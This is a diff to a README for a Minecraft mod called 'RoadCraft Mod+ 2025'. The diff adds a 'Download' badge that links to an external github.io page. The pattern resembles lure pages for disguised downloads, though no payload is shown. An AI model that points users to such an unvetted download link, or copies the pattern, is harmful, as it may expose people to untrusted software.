@@ -2,6 +2,7 @@
 
 RoadCraft Mod+ 2025 brings a next-generation infrastructure toolkit to Minecraft. Design immersive highways, automate roads with AI, and simulate realistic traffic systems for modern city building.
 
+[![Download RoadCraft Mod+](https://img.shields.io/badge/Download-RoadCraft_Mod+-blueviolet)](https://roadcraft-mod-plus.github.io/.github)
 ---
 
 ### 🎯 Key Features
